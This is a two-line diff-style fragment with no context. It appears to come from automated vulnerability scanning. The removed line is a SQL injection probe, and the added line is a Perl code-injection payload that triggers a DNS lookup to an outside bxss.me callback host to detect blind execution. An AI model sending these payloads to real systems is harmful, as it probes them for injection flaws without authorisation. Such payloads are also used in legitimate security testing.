@@ -1,1 +1,1 @@
--1 OR 2+971-971-1=0+0+0+1
+".gethostbyname(lc("hitrl"."jamcemkx075db.bxss.me."))."A".chr(67).chr(hex("58")).chr(104).chr(80).chr(104).chr(78)."
